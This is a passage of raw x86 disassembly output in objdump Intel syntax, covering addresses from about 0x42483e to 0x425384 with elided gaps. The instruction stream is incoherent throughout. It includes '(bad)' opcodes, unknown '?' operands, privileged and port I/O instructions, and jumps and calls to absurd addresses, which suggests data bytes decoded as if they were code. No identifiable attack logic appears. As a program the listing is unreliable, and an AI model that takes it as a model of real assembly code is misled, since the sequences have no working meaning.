  42483e:	or     esp,edx
  424840:	xchg   ebp,eax
  424841:	mov    ecx,0x0
	...
  4248b2:	add    BYTE PTR [eax],al
  4248b4:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x42492d
  4248c1:	xchg   DWORD PTR [ebp-0x63],edx
  4248c4:	push   es
  4248c5:	xchg   BYTE PTR [ecx],al
  4248c7:	add    dh,dh
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    ch,ch
  4248cd:	sub    al,0x9
  4248cf:	and    bh,BYTE PTR ds:0xb64ea203
  4248d5:	js     0x42485d
  4248d7:	lods   al,BYTE PTR ds:[esi]
  4248d8:	aaa    
  4248d9:	cmp    edx,ebx
  4248db:	ja     0x42491d
  4248dd:	mov    dh,dl
  4248df:	aas    
  4248e0:	test   al,0xe6
  4248e2:	pop    edx
  4248e3:	pop    edi
  4248e4:	add    edx,DWORD PTR [ecx-0x7e]
  4248e7:	in     eax,0xaf
  4248e9:	nop
  4248ea:	xlat   BYTE PTR ds:[ebx]
  4248eb:	les    ebp,FWORD PTR [eax]
  4248ed:	loope  0x424881
  4248ef:	mov    eax,0x80e4f60a
  4248f4:	lock add DWORD PTR [ecx-0x57],eax
  4248f8:	in     al,dx
  4248f9:	or     esi,DWORD PTR [edx]
  4248fb:	fidivr WORD PTR [ecx]
  4248fd:	cmp    ebp,DWORD PTR [ebx+ebx*2]
  424900:	push   ds
  424901:	js     0x4248c6
  424903:	cmp    al,BYTE PTR [eax]
  424905:	xor    al,0xee
  424907:	dec    esi
  424908:	jg     0x424949
  42490a:	or     edx,eax
  42490c:	adc    eax,0xd6c61fa1
  424911:	inc    edi
  424912:	adc    esp,esp
  424914:	xor    eax,0xe1292912
  424919:	es in  al,dx
  42491b:	stc    
  42491c:	ss inc esp
  42491e:	sub    cl,BYTE PTR [ebx+eax*8-0x35732120]
  424925:	pop    es
  424926:	xor    edx,DWORD PTR [esi+0x562f09c1]
  42492c:	xchg   BYTE PTR [ebx],al
  42492e:	push   esp
  42492f:	(bad)  
  424930:	ins    BYTE PTR es:[edi],dx
  424931:	xor    BYTE PTR [edi+0x6932f1ba],dh
  424937:	cmc    
  424938:	xchg   ecx,eax
  424939:	in     eax,0x52
  42493b:	adc    eax,0x16c4c2ba
  424940:	jl     0x4249b5
  424942:	add    esp,edx
  424944:	mov    dh,0x19
  424946:	mov    BYTE PTR [edi+0x69],al
  424949:	sahf   
  42494a:	cs dec edi
  42494c:	mov    esi,0x24bae6bf
  424951:	shr    DWORD PTR [edx+0x18],1
  424954:	fist   WORD PTR [ecx]
  424956:	cli    
  424957:	inc    ebp
  424958:	das    
  424959:	(bad)  
  42495a:	jg     0x4249bf
  42495c:	inc    ebx
  42495d:	fld    QWORD PTR [edx+0x3497d35f]
  424963:	xor    ecx,0x40
  424966:	add    eax,0xe45e429d
  42496b:	out    0x43,al
  42496d:	ja     0x424954
  42496f:	cmp    al,0x1c
  424971:	das    
  424972:	jne    0x4249eb
  424974:	js     0x42491c
  424976:	int    0x92
  424978:	push   esi
  424979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42497a:	gs inc edx
  42497c:	sbb    eax,0x90da7b6e
  424981:	out    dx,eax
  424982:	add    BYTE PTR [ebx+0x57],0x86
  424986:	lods   al,BYTE PTR ds:[esi]
  424987:	push   0x68
  424989:	sub    esi,ecx
  42498b:	aas    
  42498c:	jb     0x424935
  42498e:	sbb    BYTE PTR [eax],ch
  424990:	fist   WORD PTR [ecx+0x12]
  424993:	jmp    DWORD PTR ss:[esi]
  424996:	inc    esi
  424997:	push   edx
  424998:	push   eax
  424999:	jb     0x4249e9
  42499b:	sbb    BYTE PTR ds:0xb1161b00,al
  4249a1:	data16 add ch,dh
  4249a4:	leave  
  4249a5:	outs   dx,DWORD PTR ds:[esi]
  4249a6:	inc    eax
  4249a7:	hlt    
  4249a8:	outs   dx,BYTE PTR ds:[esi]
  4249a9:	std    
  4249aa:	fcmovnb st,st(0)
  4249ac:	adc    al,0x83
  4249ae:	aam    0x51
  4249b0:	imul   ebx,ecx,0x2c3a4dc3
  4249b6:	adc    BYTE PTR [eax+0x2189f633],0x1a
  4249bd:	sbb    ecx,DWORD PTR [bx+0x38]
  4249c1:	sti    
	...
  424a32:	add    BYTE PTR [eax],al
  424a34:	xor    BYTE PTR ds:0xdf7d9f75,bh
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	out    0xf0,eax
  424a42:	mov    dl,dl
  424a44:	cld    
  424a45:	xchg   BYTE PTR [ecx],al
  424a47:	add    dh,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    cl,bl
  424a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a4e:	int    0xef
  424a50:	test   al,0x21
  424a52:	retf   0xaf63
  424a55:	aad    0xae
  424a57:	lods   eax,DWORD PTR ds:[esi]
  424a58:	ins    BYTE PTR es:[edi],dx
  424a59:	ret    0xb801
  424a5c:	jnp    0x424a16
  424a5e:	in     al,dx
  424a5f:	add    eax,ecx
  424a61:	(bad)  
  424a62:	dec    edi
  424a63:	rcr    BYTE PTR [edx-0x1b647f7e],1
  424a69:	xchg   esp,eax
  424a6a:	jne    0x424a73
  424a6c:	les    edx,FWORD PTR [ebx-0xd]
  424a6f:	lea    edx,[ebx]
  424a71:	jbe    0x424a5a
  424a73:	sbb    esp,ebp
  424a75:	inc    esp
  424a76:	sub    DWORD PTR [esi+0x70],esi
  424a79:	xchg   BYTE PTR [ebp+eiz*2-0x3],ah
  424a7d:	(bad)  [edx]
  424a7f:	push   edi
  424a80:	enter  0x39c2,0xf4
  424a84:	arpl   WORD PTR [ebp+0x43],dx
  424a87:	pop    ss
  424a88:	lds    eax,FWORD PTR [ecx+0x64eb9eb0]
  424a8e:	sahf   
  424a8f:	jo     0x424a5e
  424a91:	pop    eax
  424a92:	sahf   
  424a93:	stos   BYTE PTR es:[edi],al
  424a94:	repnz stos DWORD PTR es:[edi],eax
  424a96:	jae    0x424a44
  424a98:	aas    
  424a99:	iret   
  424a9a:	pop    esi
  424a9b:	addr16 dec ebp
  424a9d:	cmp    ch,BYTE PTR [ecx]
  424a9f:	push   es
  424aa0:	dec    eax
  424aa1:	pop    eax
  424aa2:	push   ebp
  424aa3:	sub    al,0x95
  424aa5:	pop    ecx
  424aa6:	mov    ?,WORD PTR [ebp-0x46]
  424aa9:	retf   0xa7ab
  424aac:	mov    edi,edx
  424aae:	cld    
  424aaf:	hlt    
  424ab0:	call   0x730efb79
  424ab5:	lods   al,BYTE PTR ds:[esi]
  424ab6:	mov    al,ds:0xaccfe4d0
  424abb:	mov    cl,0xde
  424abd:	inc    edx
  424abe:	inc    esp
  424abf:	ss inc esp
  424ac1:	mov    eax,0x8e52131b
  424ac6:	push   esi
  424ac7:	xor    DWORD PTR [edi],ecx
  424ac9:	stos   BYTE PTR es:[edi],al
  424aca:	add    bh,cl
  424acc:	add    DWORD PTR [esi+0x21],ebp
  424acf:	std    
  424ad0:	loop   0x424a5a
  424ad2:	imul   ecx,DWORD PTR [ecx+0x3d],0x5cedf8d
  424ad9:	xlat   BYTE PTR ds:[ebx]
  424ada:	push   0xffffffe6
  424adc:	jmp    0xc9:0xb8ece012
  424ae3:	pop    ebx
  424ae4:	test   DWORD PTR [edi+ebx*1+0x35957d22],edx
  424aeb:	das    
  424aec:	fsubr  QWORD PTR [ebp+0x22]
  424aef:	adc    eax,0xf2f12fe1
  424af4:	ror    DWORD PTR [edx],0xce
  424af7:	test   esp,ebp
  424af9:	mov    edx,DWORD PTR [edx-0x5d1f482a]
  424aff:	inc    eax
  424b00:	inc    esp
  424b01:	dec    eax
  424b02:	in     al,0x2d
  424b04:	sar    BYTE PTR [edx-0x7d],1
  424b07:	cmp    eax,0x82f841c9
  424b0c:	stos   BYTE PTR es:[edi],al
  424b0d:	sub    eax,0xfc92098f
  424b12:	xlat   BYTE PTR ds:[ebx]
  424b13:	dec    esp
  424b14:	jae    0x424afc
  424b16:	jno    0x424b4a
  424b18:	pop    ebp
  424b19:	aas    
  424b1a:	mov    ds:0xfef54aa0,eax
  424b1f:	cli    
  424b20:	call   0xcf0fa3e6
  424b25:	mov    ebp,0xcaf4647a
  424b2a:	xchg   ebp,eax
  424b2b:	repnz outs dx,DWORD PTR ds:[esi]
  424b2d:	pop    ebx
  424b2e:	addr16 cdq 
  424b30:	(bad)  
  424b32:	sbb    al,0x8
  424b34:	fistp  WORD PTR [ebx+0x50]
  424b37:	add    al,0xd
  424b39:	clc    
  424b3a:	jo     0x424ad7
  424b3c:	aad    0x8e
  424b3e:	mov    ch,0xe4
  424b40:	pop    eax
  424b41:	scas   al,BYTE PTR es:[edi]
	...
  424bb2:	add    BYTE PTR [eax],al
  424bb4:	std    
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x4eb9f881]
  424bc1:	fldenv ds:0x187f2fc
  424bc7:	add    dh,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [esi+0x69],ah
  424bce:	repnz repz push es
  424bd1:	adc    bl,BYTE PTR fs:[ebp-0x76bc6b0a]
  424bd8:	push   es
  424bd9:	sahf   
  424bda:	fld    QWORD PTR [edx+0x3a]
  424bdd:	sub    al,0x52
  424bdf:	lea    eax,[esi+0x5e435596]
  424be5:	popf   
  424be6:	fldenv [esi]
  424be8:	and    ecx,0x182e5e7d
  424bee:	pop    esp
  424bef:	icebp  
  424bf0:	fisubr WORD PTR [esi+0x47]
  424bf3:	push   ebp
  424bf4:	push   ebp
  424bf5:	in     eax,dx
  424bf6:	sbb    cl,al
  424bf8:	inc    edi
  424bf9:	gs loope 0x424c1c
  424bfc:	call   0xcc6f:0x46a546a0
  424c03:	cmp    ecx,eax
  424c05:	xor    BYTE PTR [edx-0x4b],dl
  424c08:	(bad)  
  424c09:	mov    edi,0xe8329578
  424c0e:	stc    
  424c0f:	(bad)  
  424c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c11:	adc    ch,BYTE PTR [ebp-0x5eddd672]
  424c17:	pop    ebx
  424c18:	int    0x3c
  424c1a:	out    dx,eax
  424c1b:	lods   al,BYTE PTR ds:[esi]
  424c1c:	hlt    
  424c1d:	adc    DWORD PTR [edi+eiz*8],0x5a2fae0d
  424c24:	stos   BYTE PTR es:[edi],al
  424c25:	xchg   DWORD PTR ss:[ecx-0x7b],ebx
  424c29:	retf   0xa3f8
  424c2c:	mov    ebx,0xfbe9849b
  424c31:	neg    BYTE PTR [ebx+0x74e7c9e]
  424c37:	cli    
  424c38:	nop
  424c39:	push   ecx
  424c3a:	pop    esp
  424c3b:	lds    ebp,FWORD PTR [ebx]
  424c3d:	mov    ah,0x91
  424c3f:	dec    edi
  424c40:	jne    0x424c39
  424c42:	fimul  DWORD PTR [edx+esi*2]
  424c45:	push   ecx
  424c46:	jmp    0x424c85
  424c48:	lds    esi,FWORD PTR [ecx+0x79]
  424c4b:	test   al,0x5f
  424c4d:	mov    dh,0xdd
  424c4f:	mov    WORD PTR [edi+0x376a5164],ax
  424c56:	mov    esp,0x41ed98db
  424c5b:	mov    cs,ebp
  424c5d:	pop    eax
  424c5e:	inc    edx
  424c5f:	push   0xffffffcd
  424c61:	mov    esp,0xf42554f3
  424c66:	hlt    
  424c67:	and    eax,0x4ab1fed4
  424c6c:	iret   
  424c6d:	fadd   QWORD PTR [edx+0x1b37eda0]
  424c73:	test   eax,0x78da3456
  424c78:	ds push es
  424c7a:	jns    0x424cdd
  424c7c:	jl     0x424cfd
  424c7e:	add    eax,0x6690b5e5
  424c83:	mov    dl,0x96
  424c85:	mov    ?,WORD PTR [edx]
  424c87:	test   al,0xed
  424c89:	jle    0x424cf8
  424c8b:	sub    eax,0xe0e371f1
  424c91:	jg     0x424cd3
  424c93:	es retf 
  424c95:	retf   
  424c96:	mov    ch,0xa9
  424c98:	stos   BYTE PTR es:[edi],al
  424c99:	push   0xe67f8bc0
  424c9e:	inc    ecx
  424c9f:	xchg   BYTE PTR [ebp-0x1e],dh
  424ca2:	outs   dx,BYTE PTR ds:[esi]
  424ca3:	jecxz  0x424cb1
  424ca5:	out    dx,eax
  424ca6:	shl    DWORD PTR [edi+eax*4-0x1c],1
  424caa:	pop    ebx
  424cab:	adc    eax,0x7f80e41e
  424cb0:	mov    edi,0xc8e8523c
  424cb5:	enter  0xf546,0xb9
  424cb9:	sub    ch,dh
  424cbb:	dec    ebp
  424cbc:	mov    al,ds:0xa862293c
  424cc1:	jge    0x424cc3
	...
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4-0x114c6b29]
  424d42:	cld    
  424d43:	sahf   
  424d44:	call   0xf6424ed1
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [ecx],al
  424d4d:	adc    BYTE PTR [ebp-0x3b],bh
  424d50:	mov    bh,0x10
  424d52:	inc    edi
  424d53:	xchg   DWORD PTR [esi-0x47a0b381],eax
  424d59:	push   cs
  424d5a:	sar    bl,cl
  424d5c:	mov    al,0x8b
  424d5e:	push   ss
  424d5f:	icebp  
  424d60:	bound  eax,QWORD PTR [edi]
  424d62:	in     al,dx
  424d63:	push   es
  424d64:	imul   esp,DWORD PTR [esi-0x17],0xfa4dd2a9
  424d6b:	jae    0x424dc8
  424d6d:	sub    eax,0xbdf119fc
  424d72:	jmp    0xf679:0xf56868bb
  424d79:	fadd   st,st(5)
  424d7b:	popa   
  424d7c:	or     BYTE PTR [edx+ebp*1+0x77a78e08],ah
  424d83:	clc    
  424d84:	loopne 0x424d26
  424d86:	or     eax,0x0
  424d89:	test   BYTE PTR [edx-0x49d0e7d],ch
  424d8f:	jge    0x424d87
  424d91:	mov    edx,0xdc4454ec
  424d96:	mov    ds:0x1e9e0b06,eax
  424d9b:	dec    esi
  424d9c:	jecxz  0x424db8
  424d9e:	and    bh,BYTE PTR [edx+0x33]
  424da1:	fcomp  QWORD PTR [edi-0x6c6ff2af]
  424da7:	shl    BYTE PTR [edx+0x5f3ab4d3],1
  424dad:	xlat   BYTE PTR ds:[ebx]
  424dae:	leave  
  424daf:	cmp    dh,bh
  424db1:	iret   
  424db2:	ins    BYTE PTR es:[edi],dx
  424db3:	dec    ecx
  424db4:	retf   
  424db5:	dec    esi
  424db6:	sub    cl,BYTE PTR [eax+0x11]
  424db9:	push   esp
  424dba:	jmp    0x537c0832
  424dbf:	outs   dx,DWORD PTR ds:[esi]
  424dc0:	leave  
  424dc1:	dec    ebx
  424dc2:	in     eax,dx
  424dc3:	mov    al,0x2b
  424dc5:	and    eax,0x42f844f2
  424dca:	xchg   esi,esp
  424dcc:	mov    ah,0xd8
  424dce:	push   edx
  424dcf:	jle    0x424d72
  424dd1:	jg     0x424e1b
  424dd3:	sub    dl,BYTE PTR [edx-0xa]
  424dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dd7:	adc    DWORD PTR [ecx-0x5020da26],edi
  424ddd:	aam    0x7b
  424ddf:	cmp    ecx,DWORD PTR [esi-0x67]
  424de2:	dec    edi
  424de3:	sti    
  424de4:	dec    esi
  424de5:	pushf  
  424de6:	push   0xdde476d8
  424deb:	int3   
  424dec:	push   ecx
  424ded:	mov    ds:0xe3e80dd1,eax
  424df2:	cmc    
  424df3:	(bad)  
  424df4:	jmp    0x886cadf5
  424df9:	inc    esp
  424dfa:	aaa    
  424dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dfc:	mov    dl,0xec
  424dfe:	shr    BYTE PTR [esi+0x58],1
  424e01:	rcr    BYTE PTR [edi-0xb],1
  424e04:	das    
  424e05:	cmp    al,dl
  424e07:	sbb    dh,BYTE PTR [ebp+eiz*2-0x3e4e1449]
  424e0e:	cmc    
  424e0f:	test   BYTE PTR [ebx-0x57f51a66],al
  424e15:	repnz lods eax,DWORD PTR ds:[esi]
  424e17:	lock jge 0x424e2f
  424e1a:	popa   
  424e1b:	pop    eax
  424e1c:	dec    ecx
  424e1d:	(bad)  
  424e1e:	scas   al,BYTE PTR es:[edi]
  424e1f:	cli    
  424e20:	xchg   edx,eax
  424e21:	outs   dx,BYTE PTR ds:[esi]
  424e22:	push   esp
  424e23:	add    ebx,DWORD PTR [ecx+0x40]
  424e26:	inc    edi
  424e27:	rol    DWORD PTR [eax+0x9],cl
  424e2a:	shl    BYTE PTR [esi],1
  424e2c:	out    dx,al
  424e2d:	ffreep st(3)
  424e2f:	lods   eax,DWORD PTR ds:[esi]
  424e30:	pushf  
  424e31:	add    DWORD PTR [eax+0x49],edi
  424e34:	mov    ebx,0x83767a11
  424e39:	sahf   
  424e3a:	leave  
  424e3b:	push   edx
  424e3c:	push   ds
  424e3d:	and    al,0xfe
  424e3f:	(bad)  
  424e40:	cs daa 
	...
  424eb2:	add    BYTE PTR [eax],al
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	call   0x9fff:0xff74b964
  424ebc:	xchg   edx,eax
  424ebd:	dec    ebp
  424ebe:	lea    edx,[edx+0x3c6df95]
  424ec4:	fimul  WORD PTR [ecx+0xf60001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	lea    esp,[eax-0x9f2d604]
  424ed2:	xor    eax,0x26d6bc8c
  424ed7:	add    BYTE PTR [ebx+0x469b56b6],0xed
  424ede:	loop   0x424efa
  424ee0:	(bad)  fs:[eax-0x6b]
  424ee4:	adc    ebx,0xffffffd7
  424ee7:	rcr    DWORD PTR [edi],1
  424ee9:	cmp    cl,BYTE PTR [edi-0x6582882c]
  424eef:	enter  0x8d1,0xfe
  424ef3:	or     eax,0xf8a1d245
  424ef8:	lds    edi,FWORD PTR [ebx+0xb]
  424efb:	pop    es
  424efc:	mov    eax,esp
  424efe:	or     BYTE PTR [edx],0x8e
  424f01:	cmp    DWORD PTR [esi-0x586b2183],esp
  424f07:	scas   al,BYTE PTR es:[edi]
  424f08:	sbb    BYTE PTR [ecx],bh
  424f0a:	loopne 0x424ed4
  424f0c:	repnz mov ch,0xf3
  424f0f:	and    ch,al
  424f11:	fst    DWORD PTR [ecx+0x594a4eca]
  424f17:	dec    ebx
  424f18:	inc    ebx
  424f19:	sti    
  424f1a:	pop    esi
  424f1b:	mov    DWORD PTR [edi],eax
  424f1d:	stos   BYTE PTR es:[edi],al
  424f1e:	arpl   WORD PTR [ebx-0x73],bx
  424f21:	add    al,0x27
  424f23:	pop    edx
  424f24:	(bad)  
  424f25:	push   edx
  424f26:	repnz adc eax,DWORD PTR [ecx]
  424f29:	mov    al,ds:0x8dc43c24
  424f2e:	xchg   esi,esp
  424f30:	mov    eax,0x5ddd76f8
  424f35:	xchg   esp,eax
  424f36:	xor    DWORD PTR [edi],esp
  424f38:	xor    al,0x46
  424f3a:	std    
  424f3b:	cmp    dl,BYTE PTR [ebp-0x18]
  424f3e:	mov    WORD PTR [ebx],ds
  424f40:	xchg   esi,eax
  424f41:	xor    eax,0x3a64159b
  424f46:	and    DWORD PTR [ecx-0xe],edx
  424f49:	jp     0x424ed2
  424f4b:	cwde   
  424f4c:	fwait
  424f4d:	mov    ecx,0x1f04113d
  424f52:	cdq    
  424f53:	jb     0x424f99
  424f55:	push   ebp
  424f56:	rol    al,1
  424f58:	and    DWORD PTR [esi+0x54784a2a],esp
  424f5e:	jne    0x424fca
  424f60:	pop    eax
  424f61:	ror    BYTE PTR [edx+0x6],cl
  424f64:	mov    ecx,0xabb46798
  424f69:	add    al,0xf2
  424f6b:	push   ds
  424f6c:	mov    dh,0x69
  424f6e:	in     eax,0x8a
  424f70:	mov    dl,BYTE PTR [ebx-0x45]
  424f73:	inc    edi
  424f74:	in     eax,0x27
  424f76:	lock and DWORD PTR [esi-0x1c20aaad],ebp
  424f7d:	fcomp  QWORD PTR [esi+0x5f]
  424f80:	inc    eax
  424f81:	add    al,0xbb
  424f83:	sub    al,0x90
  424f85:	sub    al,0xba
  424f87:	into   
  424f88:	xchg   ecx,eax
  424f89:	mov    bh,0x18
  424f8b:	mov    esi,0x7b066967
  424f90:	ret    
  424f91:	add    al,0xc3
  424f93:	rol    eax,0x9
  424f96:	stos   DWORD PTR es:[edi],eax
  424f97:	xchg   DWORD PTR [edi-0x9175c1c],esi
  424f9d:	pop    esp
  424f9e:	pusha  
  424f9f:	push   0xe751ca9c
  424fa4:	repnz repnz cmp bl,BYTE PTR [ecx-0x4a5cb7ef]
  424fac:	cs dec ebx
  424fae:	(bad)  
  424faf:	pop    ecx
  424fb0:	into   
  424fb1:	xor    esp,DWORD PTR [ebp+0x1aa72b]
  424fb7:	into   
  424fb8:	sbb    BYTE PTR [ebx],0xd4
  424fbb:	nop
  424fbc:	not    BYTE PTR [eax-0x5501d350]
	...
  425032:	add    BYTE PTR [eax],al
  425034:	jl     0x42508e
  425036:	cs mov cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	jo     0x42507e
  425042:	add    eax,0x18ad441
  425047:	add    dh,dh
  425049:	add    BYTE PTR [eax],al
  42504b:	add    al,dh
  42504d:	test   al,0x91
  42504f:	pop    es
  425050:	in     al,dx
  425051:	cmp    esp,esi
  425053:	pop    ecx
  425054:	sbb    dh,BYTE PTR [eax+0x72]
  425057:	sbb    BYTE PTR [ebp+0x1ae5d46f],0x32
  42505e:	add    eax,0xb8b1ca57
  425063:	sbb    dl,cl
  425065:	in     eax,dx
  425066:	stc    
  425067:	pop    edi
  425068:	inc    edx
  425069:	or     DWORD PTR fs:[edi-0x3e9c7278],eax
  425070:	cmp    DWORD PTR [ebp-0x58],ebx
  425073:	xor    ah,dl
  425075:	fsubp  st(7),st
  425077:	pop    es
  425078:	sbb    bl,BYTE PTR [ebx-0x46]
  42507b:	sqrtps xmm1,XMMWORD PTR [eax-0x5f48434a]
  425082:	mov    dl,0x22
  425084:	mov    WORD PTR [esi+0x75],es
  425087:	call   0x1c36062e
  42508c:	cmp    eax,0x88272b04
  425091:	cld    
  425092:	aas    
  425093:	mov    bh,0x5a
  425095:	mov    esp,0x10dc3326
  42509a:	sub    BYTE PTR [esi-0x3e1b3654],bh
  4250a0:	jg     0x425028
  4250a2:	or     BYTE PTR [esi+ecx*2-0x46ade429],ah
  4250a9:	fsubr  QWORD PTR [edi]
  4250ab:	enter  0x7f39,0x26
  4250af:	inc    edx
  4250b0:	test   edi,esi
  4250b2:	xchg   edx,eax
  4250b3:	repnz mov esp,0x8acf3a15
  4250b9:	add    eax,0x86d479bb
  4250be:	add    al,0xf7
  4250c0:	mov    esi,0x1f1e62f0
  4250c5:	jmp    0x2ffd:0xb404b881
  4250cc:	pusha  
  4250cd:	fisub  WORD PTR [esi]
  4250cf:	jg     0x4250e7
  4250d1:	jbe    0x4250bf
  4250d3:	leave  
  4250d4:	es pushf 
  4250d6:	nop
  4250d7:	sbb    DWORD PTR [ecx-0x22b6c689],eax
  4250dd:	xchg   ebp,eax
  4250de:	sbb    esi,DWORD PTR [esi+0x1b]
  4250e1:	mov    eax,ds:0xb865eda8
  4250e6:	shl    esp,1
  4250e8:	inc    ecx
  4250e9:	mov    dl,BYTE PTR [edi]
  4250eb:	scas   eax,DWORD PTR es:[edi]
  4250ec:	mov    ecx,0x40abdf72
  4250f1:	mov    dl,BYTE PTR [ecx-0x69]
  4250f4:	mov    WORD PTR [eax],gs
  4250f6:	cmp    eax,0x7f2f919b
  4250fb:	leave  
  4250fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250fd:	push   0xd3e9dfd7
  425102:	jns    0x425096
  425104:	fmul   QWORD PTR [ebp-0x715a8d63]
  42510a:	sahf   
  42510b:	inc    ebx
  42510c:	int3   
  42510d:	and    BYTE PTR ds:0x1108fef1,cl
  425113:	mov    eax,ds:0x56a60c44
  425118:	mov    bh,BYTE PTR [ebp+0xb1cc1b2]
  42511e:	aaa    
  42511f:	test   eax,0xdc98528
  425124:	pushf  
  425125:	jbe    0x425183
  425127:	in     eax,dx
  425128:	inc    edx
  425129:	rcr    DWORD PTR [ebp+0x74b277f0],0x7e
  425130:	jle    0x425190
  425132:	or     eax,0xc9505816
  425137:	and    ebx,ecx
  425139:	popa   
  42513a:	push   es
  42513b:	xor    ah,ch
  42513d:	fisubr WORD PTR [eax-0x62]
  425140:	das    
  425141:	mov    cl,0x0
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	push   es
  4251c1:	lods   eax,DWORD PTR ds:[esi]
  4251c2:	call   0xf600:0x18bca32
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [ebx-0x42],dl
  4251ce:	dec    edx
  4251cf:	cmp    DWORD PTR [esi+0x4f96cb06],edx
  4251d5:	sub    ecx,edx
  4251d7:	add    BYTE PTR [ecx+0xa],cl
  4251da:	rcl    BYTE PTR [esp+edi*1+0x3edb4552],cl
  4251e1:	mov    ch,0xfe
  4251e3:	or     DWORD PTR [edx-0x23ac3a43],0x55ca0ce6
  4251ed:	or     BYTE PTR [ebx+ecx*2-0x59],ch
  4251f1:	jle    0x425193
  4251f3:	lds    esi,FWORD PTR [esi-0x3a]
  4251f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f7:	xchg   ebx,eax
  4251f8:	push   ebx
  4251f9:	cmp    al,0x1e
  4251fb:	ja     0x42527b
  4251fd:	sbb    eax,0xffddc4e5
  425202:	clc    
  425203:	inc    edi
  425204:	mov    BYTE PTR [ebp+0x7020e072],bh
  42520a:	cmc    
  42520b:	data16 cmp BYTE PTR gs:[edx],0xa7
  425210:	sub    DWORD PTR [esi-0x60],edx
  425213:	mov    ch,0xd4
  425215:	mov    WORD PTR [eax+0x5e],?
  425218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425219:	mov    ch,0x82
  42521b:	dec    ebp
  42521c:	mov    ?,WORD PTR [esi-0x4d]
  42521f:	in     eax,dx
  425220:	mov    dl,0xed
  425222:	in     al,0x7c
  425224:	loope  0x4251cc
  425226:	xchg   BYTE PTR [ecx+0x44ce2309],dl
  42522c:	mov    ch,0x68
  42522e:	mov    BYTE PTR [eax-0x1e],cl
  425231:	jmp    0xfe4a4b2e
  425236:	inc    esi
  425237:	leave  
  425238:	shl    BYTE PTR [edx-0x7f],1
  42523b:	adc    esi,ebx
  42523d:	scas   eax,DWORD PTR es:[edi]
  42523e:	(bad)  
  42523f:	mov    ds:0xefb9857d,eax
  425244:	test   BYTE PTR [edi-0x7f07bd2f],bl
  42524a:	(bad)  
  42524c:	xchg   esp,eax
  42524d:	dec    edx
  42524e:	or     al,0xaf
  425250:	imul   edx,DWORD PTR [edi-0x3dc18ddb],0xaa710489
  42525a:	xchg   esi,eax
  42525b:	stc    
  42525c:	mov    ds:0xe541a346,al
  425261:	sbb    ebp,esi
  425263:	add    eax,0x4e59f441
  425268:	add    BYTE PTR [edi+0x29],ah
  42526b:	mov    ebp,0xb977cbd6
  425270:	dec    ebp
  425271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425272:	fwait
  425273:	cdq    
  425274:	and    al,0x92
  425276:	sub    esi,eax
  425278:	sbb    DWORD PTR [edi+0x386570f1],0xd01f487f
  425282:	and    eax,0xe1d398e2
  425287:	jl     0x42526c
  425289:	clc    
  42528a:	cs in  al,dx
  42528c:	fcomp  QWORD PTR [edi]
  42528e:	call   0x4f66:0xc4443939
  425295:	aaa    
  425296:	das    
  425297:	add    cl,BYTE PTR [edx-0x29acabb5]
  42529d:	fld    QWORD PTR [ecx+0x6f]
  4252a0:	mov    cl,0xd3
  4252a2:	xor    eax,0xc6abd873
  4252a7:	xchg   esi,eax
  4252a8:	push   ss
  4252a9:	outs   dx,BYTE PTR ds:[esi]
  4252aa:	mov    dl,0xfb
  4252ac:	dec    eax
  4252ad:	into   
  4252ae:	out    dx,al
  4252af:	xor    al,0xe0
  4252b1:	lds    ebp,FWORD PTR [ebx]
  4252b3:	je     0x425238
  4252b5:	mov    ebp,ss
  4252b7:	add    BYTE PTR [eax+0x4ad3c691],ch
  4252bd:	and    DWORD PTR [edx+edi*2+0x8b2f],esp
	...
  425334:	mov    ah,BYTE PTR [esi]
  425336:	jge    0x4252f2
  425338:	std    
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz mov DWORD PTR cs:[ebx],0x18cc060
  425347:	add    dh,dh
  425349:	add    BYTE PTR [eax],al
  42534b:	add    bl,ah
  42534d:	xor    cl,ch
  42534f:	xor    BYTE PTR [esp+ebx*4],al
  425352:	cmp    al,0x26
  425354:	cpuid  
  425356:	mov    dh,BYTE PTR [edx+0x3]
  425359:	inc    ebp
  42535a:	cmp    eax,DWORD PTR [eax]
  42535c:	scas   al,BYTE PTR es:[edi]
  42535d:	ret    0x73ee
  425360:	pop    esi
  425361:	mov    ebp,ecx
  425363:	xchg   ebx,eax
  425364:	pop    edi
  425365:	mov    edx,0x536a3ae7
  42536a:	mov    al,ds:0xf75e4e94
  42536f:	int    0x8c
  425371:	adc    al,ah
  425373:	jl     0x42536a
  425375:	mov    bl,0x2
  425377:	sub    bl,ch
  425379:	sahf   
  42537a:	push   ebx
  42537b:	fcomp  DWORD PTR [ecx+0x348e042e]
  425381:	cs jmp 0x4253c8
  425384:	push   esp
